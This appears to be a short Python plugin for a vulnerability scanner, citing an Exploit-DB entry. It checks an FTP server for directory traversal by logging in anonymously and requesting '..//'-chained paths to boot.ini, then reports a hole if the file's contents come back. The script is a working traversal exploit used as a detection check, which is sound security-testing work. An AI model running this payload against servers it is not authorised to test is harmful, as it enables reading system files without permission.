#!/usr/bin/env python
#refer:https://www.exploit-db.com/exploits/38340/
from ftplib import FTP

def assign(service, arg):
    if service == "ftp":
        return True, arg

def audit(arg):
    host=arg[0]
    port=str(arg[1])
    try:
        ftp = FTP()
        ftp.connect(host,port)
        ftp.login()                   
        ftp.retrbinary('RETR ..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
        ftp.close()
        file = open('boot.ini.txt', 'r')
        if "boot loader" in file.read():
            security_hole(host+":"+port)
    except Exception, e:
        pass
    

    
if __name__ == '__main__':
    from dummy import *
    audit(assign('ftp',('127.0.0.1',21))[1])